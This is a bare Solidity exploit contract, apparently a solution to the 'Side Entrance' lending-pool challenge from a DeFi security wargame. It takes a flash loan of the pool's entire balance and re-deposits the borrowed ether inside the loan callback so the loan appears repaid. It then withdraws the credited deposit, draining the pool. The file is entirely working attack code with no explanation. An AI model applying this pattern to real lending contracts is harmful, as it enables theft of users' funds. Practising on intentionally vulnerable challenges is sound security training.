// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external ;
    function flashLoan(uint256 amount) external;

} 


contract Attack {

    ISideEntranceLenderPool public pool;

    function pwn(address _pool) public {

        pool = ISideEntranceLenderPool(_pool);

        pool.flashLoan(address(pool).balance);

        pool.withdraw();

    }  


    function execute() public payable {

        pool.deposit{value : msg.value}() ;
    }

    receive() external payable {}

}